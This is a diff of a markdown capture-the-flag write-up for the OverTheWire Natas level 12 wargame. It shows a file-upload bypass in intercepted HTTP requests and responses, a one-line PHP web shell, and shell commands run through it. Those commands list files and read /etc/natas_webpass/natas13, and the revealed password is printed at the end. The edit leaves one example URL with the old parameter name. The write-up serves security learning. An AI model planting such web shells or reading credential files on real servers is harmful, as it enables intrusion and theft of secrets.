@@ -1275,6 +1275,8 @@ By inspecting the source code, it can be observed that the application determine
 
 
 ### Finding 
+#### Request Content
+```
 POST /index.php HTTP/1.1
 Host: natas12.natas.labs.overthewire.org
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
@@ -1306,9 +1308,9 @@ Content-Type: image/jpeg
 
 
 (content of the image file) **At here, some of the conetent is deleted so that the size of the file can less than maximum file size (1000 Bytes)**
+```
 
-
-Response: 
+#### Response Content 
 ```
 HTTP/1.1 200 OK
 Date: Mon, 13 Apr 2026 13:50:59 GMT
@@ -1371,10 +1373,23 @@ Content-Disposition: form-data; name="filename"
 Content-Disposition: form-data; name="uploadedfile"; filename="picture1.jpeg"
 Content-Type: application/x-php
 
-<?php passthru($_GET['bandit12']); ?>
+<?php passthru($_GET['natas12']); ?>
 
 -----------------------------351904127543584259351122112--
 ```
+
+Intercepting the request using Burp Suite reveals that the filename parameter can be modified. Instead of keeping the default .jpg extension, it is changed to .php, allowing a PHP script to be uploaded.
+
+A malicious payload is then injected into the file content:
+```
+<?php passthru($_GET['natas12']); ?>
+```
+This payload enables remote command execution via a URL parameter.
+
+After modifying the request:
+- Change filename to a .php extension
+- Replace the file content with the PHP payload
+- Send the request
 
 #### Response content: 
 ```
@@ -1406,35 +1421,22 @@ The file <a href="upload/vodo7kpu39.php">upload/vodo7kpu39.php</a> has been uplo
 </html>
 ```
 
-Intercepting the request using Burp Suite reveals that the filename parameter can be modified. Instead of keeping the default .jpg extension, it is changed to .php, allowing a PHP script to be uploaded.
-
-A malicious payload is then injected into the file content:
-```
-<?php passthru($_GET['bandit12']); ?>
-```
-This payload enables remote command execution via a URL parameter.
-
-After modifying the request:
-- Change filename to a .php extension
-- Replace the file content with the PHP payload
-- Send the request
-
 The server successfully uploads the file and returns a messsage "The file upload/vodo7kpu39.php has been uploaded" is displayed. Next, if clicking the link `upload/vodo7kpu39.php` will navigate to `http://natas12.natas.labs.overthewire.org/upload/vodo7kpu39.php` and get the following message: 
 ```
-Notice: Undefined index: bandit12 in /var/www/natas/natas12/upload/vodo7kpu39.php on line 1
+Notice: Undefined index: natas12 in /var/www/natas/natas12/upload/vodo7kpu39.php on line 1
 Warning: passthru(): Cannot execute a blank command in /var/www/natas/natas12/upload/vodo7kpu39.php on line 1
 ```
-Accessing this file directly results in an error because no command is provided. However, by appending a query parameter `?bandit12=ls`, commands can be executed. 
+Accessing this file directly results in an error because no command is provided. However, by appending a query parameter `?natas12=ls`, commands can be executed. 
 
 For example, 
-change the link to `http://natas12.natas.labs.overthewire.org/upload/vodo7kpu39.php?bandit12=ls`
+change the link to `http://natas12.natas.labs.overthewire.org/upload/vodo7kpu39.php?natas12=ls`
 and many files are displayed. 
 ```
 01bigp04x7.jpg 01fsa2644e.jpg 01kjg7ulvc.php 022sjfkuwh.php 03ch7myxsp.jpg 04assx4poq.jpg 05xsaulnkl.jpg 06nwepxdiz.php 06zm2zlp06.jpg 078o93t3j2.jpg 07a5kdl5z9.jpg 08rwwwg6s1.php 092suz141s.php 09rfuwcp4j.jpg 0ams7zb4s1.jpg 0b87iktaek.jpg 0dma0zht0x.jpg 0g61wmmk1b.php 0gn1xn0fbt.php 0i4zzz9jzt.jpg 0k1u3i93kk.jpgaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa 0mr5hvltj1.jpg 0n9bbv6c0s.jpg 0o3dgvqc07.jpg 0oklxf29sd.php 0pvupmvufi.jpg 0r11bpi050.php 0rv2aw0wx4.php 0rve6oxo6g.jpg 0slsuamtzz.php 0t28zwuwf5.jpg 0v47rcr60b.jpg 0wkd0y4mtj.jpg 0x2g8juukh.jpg 0xgvkqahot.php 0y664sk9s1.php 0zvecabpxi.txt%7f 11csvhcimo.jpg 127wtu6wcx.jpg 12qub97lsg.jpg 14jmyp172u.php 15nyx7zwv7.jpg 15xc1kfy8u.jpg 17d37hyq3h.jpg 18haov338q.jpg 19jzfg9xlv.jpg 19wxioc80x.app 1bf11s9nk6.jpgfgh 1bu6gzxiaw.php
 ```
 This confirms that the uploaded file is being executed as a PHP script.
 
-Finally, retrieving the password is achieved by executing: `?bandit12=cat /etc/natas_webpass/natas13`, which returns the credential for the next level.
+Finally, retrieving the password is achieved by executing: `?natas12=cat /etc/natas_webpass/natas13`, which returns the credential for the next level.
 
 For example: 
 `http://natas12.natas.labs.overthewire.org/upload/vodo7kpu39.php?bandit12=cat%20/etc/natas_webpass/natas13` will get the output trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
